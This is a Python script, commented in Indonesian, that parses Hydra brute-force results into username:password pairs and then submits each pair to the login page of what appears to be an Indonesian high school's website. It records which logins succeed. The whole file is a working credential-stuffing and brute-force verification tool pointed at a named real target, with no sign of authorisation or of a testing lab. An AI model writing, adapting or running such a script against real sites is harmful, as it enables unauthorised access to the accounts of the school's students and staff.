import requests
from tqdm import tqdm
import time
import os
import re

# Konfigurasi
LOGIN_URL = "https://sman6psp.sch.id/auth/login"
SUCCESS_KEYWORD = "Dashboard"  # Kata yang muncul jika login sukses
COMBINED_FILE = "valid_creds.txt"
HYDRA_FILE = "hydra_results.txt"
LOG_FILE = "check.log"
DELAY = 2  # Detik antara request

# Fungsi untuk parsing hydra_results.txt jadi valid_creds.txt
def parse_hydra_results():
    if not os.path.exists(HYDRA_FILE):
        print(f"❌ File {HYDRA_FILE} tidak ditemukan.")
        return False

    with open(HYDRA_FILE, "r") as f:
        lines = f.readlines()

    creds = []
    for line in lines:
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match:
            username = match.group(1)
            password = match.group(2)
            creds.append(f"{username}:{password}")

    if creds:
        with open(COMBINED_FILE, "w") as out:
            out.write("\n".join(creds))
        print(f"✅ {len(creds)} kredensial disimpan ke {COMBINED_FILE}")
        return True
    else:
        print("❌ Tidak menemukan kredensial di hydra_results.txt")
        return False

# Fungsi untuk memeriksa login
def check_credentials():
    if not os.path.exists(COMBINED_FILE):
        print(f"❌ Tidak ada file {COMBINED_FILE}. Jalankan parsing dulu!")
        return

    with open(COMBINED_FILE, "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    if not lines:
        print("❌ File kredensial kosong.")
        return

    print(f"🔍 Mengecek {len(lines)} kombinasi username:password...\n")
    success_creds = []

    for line in tqdm(lines, desc="Testing credentials"):
        try:
            username, password = line.split(":", 1)
        except ValueError:
            continue

        data = {"email": username, "password": password}
        response = requests.post(LOGIN_URL, data=data, timeout=10)

        if SUCCESS_KEYWORD in response.text:
            print(f"\n✅ LOGIN BERHASIL: {username}:{password}")
            success_creds.append(f"{username}:{password}")
        time.sleep(DELAY)

    with open(LOG_FILE, "w") as log:
        if success_creds:
            log.write("\n".join(success_creds))
            print(f"\n🔥 {len(success_creds)} login berhasil! Lihat di {LOG_FILE}")
        else:
            log.write("Tidak ada yang berhasil.")
            print("\n❌ Tidak ada login yang berhasil.")

# Jalankan proses
if __name__ == "__main__":
    print("=== MODE OTOMATIS HYDRA ➝ VALID CREDS ➝ CEK LOGIN ===")
    if parse_hydra_results():
        check_credentials()
    else:
        print("❗ Gagal parsing hydra_results.txt")
